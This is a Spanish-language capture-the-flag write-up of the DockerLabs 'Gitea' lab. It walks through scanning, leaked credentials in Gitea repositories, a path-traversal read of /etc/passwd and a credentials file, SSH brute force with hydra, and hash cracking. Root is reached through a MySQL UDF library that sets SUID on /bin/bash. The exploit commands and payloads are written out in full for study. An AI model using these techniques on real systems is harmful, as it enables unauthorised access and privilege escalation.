---
title: DockerLabs - Gitea
summary: "Write-up del laboratorio Gitea de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:53:07
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_gitea"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ nmap -sCV -p22,80,3000 172.17.0.2
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e5:9a:b5:5e:a7:fc:3b:2f:7e:62:dd:51:61:f5:aa:2e (ECDSA)
|_  256 8e:ff:03:d7:9b:72:10:c9:72:03:4d:b8:bb:77:e9:b2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: DaCapoDocs
|_http-server-header: Apache/2.4.58 (Ubuntu)
3000/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=36911682f6a4647a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=dWTNeI5yJtTFpi7-0AiNshigtQ86MTc2ODkzNTQ1OTU0OTQyNjg2OQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: XXX, XX XXX XXXX XX:XX:XX GMT
|     <!DOCTYPE html>
|     <html lang="en-US" data-theme="gitea-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2FkbWluLnMzY3IzdGRpci5kZXYuZ2l0ZWEuZGwvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9hZG1pbi5zM2NyM3RkaXIuZGV2LmdpdGVhLmRsL2Fzc2V0cy9pbWcvbG9nby5wbm"
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=68d3b8c7ed1ee9bc; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=c1ZjW5xSXk_y1eIRCNTkGo4I6MU6MTc2ODkzNTQ1OTYwMjM5MDE3MQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: XXX, XX XXX XXXX XX:XX:XX GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## análisis

### puerto 80

Comenzamos revisando la página web que se aloja en el puerto 80 de la máquina:

![Desktop View](/20260120200107.webp){: width="972" height="589" .shadow}

Dejaremos también en segundo plano **gobuster** buscando por fuerza bruta recursos en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 13615]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/LICENSE              (Status: 200) [Size: 35149]
/server-status        (Status: 403) [Size: 275]
```


### puerto 3000

El análisis ejecutado con **nmap** nos ha desvelado que también hay un **Gitea** (software de código abierto alojado en servidores propios que permite gestionar repositorios Git) desplegado en el puerto 3000 de la máquina:

![Desktop View](/20260120200527.webp){: width="972" height="589" .shadow}

Emplearemos para este caso **gobuster** nuevamente para buscar recursos en el puerto 3000:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ gobuster dir -u "http://172.17.0.2:3000" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:3000
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/issues               (Status: 303) [Size: 38] [--> /user/login]
/admin                (Status: 200) [Size: 19853]
/v2                   (Status: 401) [Size: 50]
/explore              (Status: 303) [Size: 41] [--> /explore/repos]
/Admin                (Status: 200) [Size: 19852]
/designer             (Status: 200) [Size: 27641]
/milestones           (Status: 303) [Size: 38] [--> /user/login]
/notifications        (Status: 303) [Size: 38] [--> /user/login]
```

Vemos que el recurso `/admin` nos redirige a la página del usuario `admin`, el cual no tiene ningún repositorio ni ningún proyecto creado:

![Desktop View](/20260120201557.webp){: width="972" height="589" .shadow}

Accedemos al panel de autenticación mediante el botón `Sign In` ubicado en la esquina superior derecha, el cual nos indica el subdominio `admin.s3cr3tdir.dev.gitea.dl` en un aviso:

![Desktop View](/20260120201910.webp){: width="972" height="589" .shadow}

Agregaremos este subdominio al fichero `/etc/hosts` de nuestra maquina, junto con los dominios superiores al mismo, ya que así, en caso de haber virtual hosting, podremos acceder a recursos que de primeras no podríamos acceder:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ cat /etc/hosts | grep gitea 
172.17.0.2      admin.s3cr3tdir.dev.gitea.dl s3cr3tdir.dev.gitea.dl dev.gitea.dl gitea.dl
```

### admin.s3cr3tdir.dev.gitea.dl

Accedemos al subdominio que nos indicaban en el mensaje, y vemos que accedemos a la misma instancia de `Gitea`.

Revisamos los repositorios que tenemos disponibles:

![Desktop View](/20260120202502.webp){: width="972" height="589" .shadow}

#### giteaInfo

Vemos en los cambios realizados en los commits información relacionada con la estructura interna que podría tener `Gitea` en la máquina:

![Desktop View](/20260120212350.webp){: width="972" height="589" .shadow}

![Desktop View](/20260120213058.webp){: width="972" height="589" .shadow}

#### mysql

En el repositorio `mysql` vemos que están expuestos datos como el usuario `designer`, el nombre de la base de datos y credenciales de acceso:

![Desktop View](/20260120204415.webp){: width="972" height="589" .shadow}

#### myapp

El repositorio `myapp` pertenece a un aplicativo que no hemos visto todavía, el cual expone la clave secreta de **Flask**:

![Desktop View](/20260120204657.webp){: width="972" height="589" .shadow}

Tras analizar el script `app.py`, vemos que dicha aplicación tiene configurado en el recurso `/download` la posibilidad de descargar ficheros del sistema:

![Desktop View](/20260120211659.webp){: width="972" height="589" .shadow}

Con la información obtenida, pasaremos a revisar los demás subdominios en busca de vectores de entrada al sistema.

### s3cr3tdir.dev.gitea.dl

Nuevamente ejecutaremos **gobuster** para obtener los recursos del subdominio mientras revisamos la web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ gobuster dir -u "http://s3cr3tdir.dev.gitea.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3cr3tdir.dev.gitea.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 13374]
/assets               (Status: 301) [Size: 333] [--> http://s3cr3tdir.dev.gitea.dl/assets/]
/tutorials.html       (Status: 200) [Size: 6808]
/free.html            (Status: 200) [Size: 7958]
/css                  (Status: 301) [Size: 330] [--> http://s3cr3tdir.dev.gitea.dl/css/]
/js                   (Status: 301) [Size: 329] [--> http://s3cr3tdir.dev.gitea.dl/js/]
/javascript           (Status: 301) [Size: 337] [--> http://s3cr3tdir.dev.gitea.dl/javascript/]
/premium.html         (Status: 200) [Size: 10166]
/fonts                (Status: 301) [Size: 332] [--> http://s3cr3tdir.dev.gitea.dl/fonts/]
/LICENSE              (Status: 200) [Size: 1070]
/server-status        (Status: 403) [Size: 287]

===============================================================
Finished
===============================================================
```

Tras analizar la página web, no encontramos nada de información relevante:

![Desktop View](/20260120204022.webp){: width="972" height="589" .shadow}

### dev.gitea.dl

Buscaremos nuevamente con **gobuster** recursos en el sistema mientras revisamos la página web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ gobuster dir -u "http://dev.gitea.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.gitea.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/search/]
/about.html           (Status: 200) [Size: 123571]
/contact.html         (Status: 200) [Size: 49689]
/index.html           (Status: 200) [Size: 265382]
/signup.html          (Status: 200) [Size: 53916]
/assets               (Status: 301) [Size: 313] [--> http://dev.gitea.dl/assets/]
/pricing.html         (Status: 200) [Size: 49178]
/src                  (Status: 301) [Size: 310] [--> http://dev.gitea.dl/src/]
/javascript           (Status: 301) [Size: 317] [--> http://dev.gitea.dl/javascript/]
/signin.html          (Status: 200) [Size: 53297]
/404.html             (Status: 200) [Size: 84362]
/LICENSE              (Status: 200) [Size: 1066]
/server-status        (Status: 403) [Size: 277]

===============================================================
Finished
===============================================================
```

Sin embargo, no vemos nada que nos indique como podemos avanzar:

![Desktop View](/20260120203851.webp){: width="972" height="589" .shadow}

Por ello, continuaremos revisando el subdominio `gitea.dl`.

### gitea.dl

Vemos en la página principal del domino `gitea.dl` un panel de login, y un placeholder para el campo de la contraseña un poco sospechoso:

![Desktop View](/20260120203920.webp){: width="972" height="589" .shadow}

Dejaremos **gobuster** buscando en segundo plano buscando recursos mientras analizamos la página web, el cual finalmente nos descubre el recurso `/download`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ gobuster dir -u "http://gitea.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 2>/dev/null 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gitea.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 302) [Size: 189] [--> /]
```

## acceso inicial (designer)

El recurso `/download` podría tratarse del que vimos en **Gitea** en el repositorio `myapp`, donde vimos que podemos descargar ficheros del sistema indicando el parámetro `filename`, así que probamos esta funcionalidad:

```bash
http://gitea.dl/download?filename=../../../../../../../../etc/passwd
```

![Desktop View](/20260120211607.webp){: width="972" height="589" .shadow}

Habiendo obtenido un **LFI**, vimos en el repositorio de **Gitea** que en `/opt/info.txt` podría haber un fichero, por lo que probamos a descargárnoslo:

```bash
http://gitea.dl/download?filename=../../../../../../../../opt/info.txt
```

Vemos que el fichero contiene una serie de usuarios y contraseñas:

![Desktop View](/20260120212939.webp){: width="972" height="589" .shadow}

Movemos el fichero obtenido a la carpeta de la máquina, y procedemos a obtener las credenciales empleando `awk`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ mv ~/Downloads/info.txt .
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ cat info.txt | awk '{print $1}'
user001:***********
user002:**********
user003:************
user004:**********
...
```

Lo siguiente será quedarse únicamente con las contraseñas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ cat info.txt | awk '{print $1}' | awk '{print $2}' FS=":"
***********
**********
************
**********
....
```

Guardamos todas las contraseñas en un fichero y probamos a ver si alguna de las contraseñas es la del usuario `designer` que vimos anteriormente para acceder por SSH, y resulta su contraseña estaba dentro del listado de contraseñas que hemos obtenido:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ hydra -l designer -P wordlist ssh://172.17.0.2 -I 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-20 20:38:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: designer   password: **********************
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
```

Procedemos a conectarnos a la máquina por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ ssh designer@172.17.0.2
designer@172.17.0.2`s password:
designer@c122048a419e:~$ whoami
designer
designer@c122048a419e:~$ hostname -I
172.17.0.2
```

Tal y como vimos anteriormente, los únicos usuarios del sistema que tienen una consola asignada en el fichero `/etc/passwd` son los siguientes:

```bash
designer@c122048a419e:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
designer:x:1001:1001::/home/designer:/bin/bash
```

Revisamos los permisos SUDO del usuario `designer`, pero vemos que no cuenta con ellos:

```bash
designer@c122048a419e:~$ sudo -l
[sudo] password for designer: 
Sorry, user designer may not run sudo on c122048a419e.
```

La primera flag la encontramos en el directorio del usuario `designer`:

```bash
designer@c122048a419e:~$ cat user.txt 
4683****************************
```

## escalada de privilegios (root)

En el directorio personal del usuario `designer` encontramos la estructura de carpetas que compone los diferentes subdominios y aplicativos que hemos visto hasta ahora:

```bash
designer@c122048a419e:~$ ls -la
total 64
drwxr-x--- 1 designer designer 4096 Jan 20 21:38 .
drwxr-xr-x 1 root     root     4096 Feb 24  2025 ..
-rw-r--r-- 1 designer designer  220 Feb 24  2025 .bash_logout
-rw-r--r-- 1 designer designer 3771 Feb 24  2025 .bashrc
drwx------ 2 designer designer 4096 Jan 20 21:38 .cache
drwxrwxr-x 3 designer designer 4096 Feb 26  2025 .local
-rw------- 1 designer designer   13 Feb 26  2025 .mysql_history
-rw-r--r-- 1 designer designer  807 Feb 24  2025 .profile
drwx------ 1 designer designer 4096 Feb 25  2025 .ssh
drwxr-x--- 1 designer designer 4096 Feb 24  2025 gitea
drwxr-xr-x 3 root     root     4096 Feb 26  2025 giteaInfo
drwxr-xr-x 3 designer designer 4096 Feb 24  2025 mysql
-rw-r--r-- 1 root     root       33 Feb 26  2025 user.txt
```

Nos traeremos la base de datos de **Gitea** (`/home/designer/gitea/data/gitea.db`) a nuestro equipo para poder revisarla y sacar los hashes de los usuarios, y tratar de obtener las credenciales por fuerza bruta.

Abriremos un servidor web con Python:

```bash
designer@c122048a419e:~$ ls -la gitea/data/gitea.db 
-rw-r--r-- 1 designer designer 2097152 XX XX XX:XX gitea/data/gitea.db
designer@c122048a419e:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Desde nuestra máquina nos descargaremos el fichero `gitea.db`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ wget http://172.17.0.2:8080/gitea.db       
--XXXX-XX-XX XX:XX:XX--  http://172.17.0.2:8080/gitea.db
Connecting to 172.17.0.2:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2097152 (2.0M) [application/octet-stream]
Saving to: ‘gitea.db’

gitea.db                                             100%[====================================================================================================================>]   2.00M  --.-KB/s    in 0.009s  

XXXX-XX-XX XX:XX:XX (218 MB/s) - ‘gitea.db’ saved [2097152/2097152]
```

Abrimos el fichero con la utilidad `sqlite3` y revisamos la tabla que nos interesa, que en este caso es `user`, la cual contiene los hashes y los salt de los usuarios de **Gitea**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ sqlite3 gitea.db                                                                               
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
...            
language_stat              user                     
lfs_lock                   user_badge               
lfs_meta_object            user_blocking            
login_source               user_open_id             
...
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` INTEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `description` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibility` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_restricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organization` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAULT 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
...
sqlite> select lower_name,salt,passwd from user;
admin|b4b9****************************|fc04************************************************************************************************
designer|0fac****************************|9f27************************************************************************************************
test|6689****************************|ec5c************************************************************************************************
```

Ahora usaremos el script [crack.py](https://benheater.com/hackthebox-compiled/#crack-the-hash) (se debe modificar para indicar el hash y el salt de cada usuario) para tratar de obtener las contraseñas de los usuarios de la base de datos de **Gitea**, donde al parecer los dos usuarios (`admin` y `designer`) tienen la misma contraseña:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ python3 crack.py
Password found for admin: **********************

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Gitea]
└─$ python3 crack.py
Password found for designer: **********************
```

En la pantalla de autenticación del dominio `gitea.dl` nos sugerían unas credenciales como placeholders, y si probamos a acceder con ellas al gestor de bases de datos, veremos que accedemos correctamente:

```bash
designer@c122048a419e:~$ mysql -uadmin -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 12
Server version: 10.11.8-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Encontramos una manera de realizar la [escalada de privilegios](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#privilege-escalation-via-library) cuando tenemos acceso a un gestor de bases de datos `mysql`.

Comenzaremos por compilar el [script en C](https://www.exploit-db.com/exploits/1518) que nos indican:

```bash
designer@c122048a419e:~$ find / -iname *lib_mysqludf_sys* 2>/dev/null
designer@c122048a419e:~$ nano raptor_udf2.c
designer@c122048a419e:~$ gcc -g -c raptor_udf2.c
designer@c122048a419e:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
designer@c122048a419e:~$ ls -la | grep raptor
-rw-rw-r-- 1 designer designer  3287 XXX XX XX:XX raptor_udf2.c
-rw-rw-r-- 1 designer designer  5216 XXX XX XX:XX raptor_udf2.o
-rwxrwxr-x 1 designer designer 17464 XXX XX XX:XX raptor_udf2.so
```

A la hora de crear una tabla que usaremos para cargar la librería maliciosa, vemos que no tenemos permisos:

```bash
MariaDB [(none)]> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]> create table npn(line blob);
ERROR 1142 (42000): CREATE command denied to user 'admin'@'localhost' for table `mysql`.`npn`
```

Esto impide poder cargar la librería dentro de la carpeta `plugins` usando una tabla, por lo que debemos hacerlo manualmente.

Listamos la carpeta en la que se encuentran los plugins, que sería `/usr/lib/mysql/plugin/`:

```bash
MariaDB [(none)]> show variables like '%plugin%';
+-----------------+------------------------+
| Variable_name   | Value                  |
+-----------------+------------------------+
| plugin_dir      | /usr/lib/mysql/plugin/ |
| plugin_maturity | gamma                  |
+-----------------+------------------------+
2 rows in set (0.001 sec)
```

Procedemos a movernos a dicho directorio, y listar sus permisos, donde vemos que otros pueden escribir:

```bash
designer@c122048a419e:~$ ls -la /usr/lib/mysql
total 12
drwxr-xr-x 1 root root 4096 Feb 25  2025 .
drwxr-xr-x 1 root root 4096 Feb 27  2025 ..
drwxr-xrwx 1 root root 4096 Feb 26  2025 plugin
```

Copiamos la librería que creamos anteriormente:

```bash
designer@c122048a419e:~$ cp raptor_udf2.so /usr/lib/mysql/plugin
designer@c122048a419e:~$ ls -la /usr/lib/mysql/plugin/ | grep raptor
-rwxrwxr-x 1 designer designer  17464 XXX XX XX:XX raptor_udf2.so
```

Ahora retomaremos el proceso que nos indicaban desde la creación de la función `sys_exec`, pero como la función dentro de la librería tiene el nombre `do_system`, debemos emplear dicho nombre:

```bash
MariaDB [(none)]> create function sys_exec returns integer soname 'raptor_udf2.so';
ERROR 1127 (HY000): Can`t find symbol 'sys_exec' in library
MariaDB [(none)]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.005 sec)
```

Listaremos las funciones declaradas, y vemos la que acabamos de crear:

```bash
MariaDB [(none)]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.001 sec)
```

Para poder obtener una consola como el usuario `root`, emplearemos el método de otorgar el permiso **SUID** (permite ejecutar binario con permisos del propietario) al binario `/bin/bash`.

Comprobamos los permisos que tiene el binario `/bin/bash`:

```bash
designer@c122048a419e:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Ahora ejecutaremos el comando que otorgará permisos SUID a este binario, para que podamos ejecutarlo con permisos del propietario, es decir, como `root`:

```bash
MariaDB [(none)]> select do_system('chmod u+s /bin/bash');
+----------------------------------+
| do_system('chmod u+s /bin/bash') |
+----------------------------------+
|                                0 |
+----------------------------------+
1 row in set (0.025 sec)
```

Si volvemos a revisar los permisos, veremos que se han modificado correctamente:

```bash
designer@c122048a419e:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Solo queda invocar la consola de manera privilegiada:

```bash
designer@c122048a419e:~$ bash -p
bash-5.2# whoami
root
```

La segunda flag es:

```bash
bash-5.2# cat /root/root.txt 
d5a2****************************
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>